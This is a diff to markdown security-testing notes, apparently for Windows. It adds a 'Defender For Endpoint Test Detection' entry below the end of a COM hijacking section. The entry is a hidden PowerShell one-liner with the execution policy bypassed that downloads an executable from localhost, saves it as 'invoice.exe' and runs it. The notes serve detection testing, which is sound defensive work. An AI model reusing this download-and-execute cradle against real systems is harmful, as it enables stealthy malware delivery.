@@ -67,3 +67,12 @@ Get-Item -Path "HKCU:\Software\Classes\CLSID\{<CLISD-ID>}\InprocServer32"
 # Clean Up
 Remove-Item "HKCU:\Software\Classes\CLSID\{<CLSID-ID>}" -Recurse
 ```
+
+
+# **Misc**
+
+## **Defender For Endpoint Test Detection**
+
+```
+powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
+```
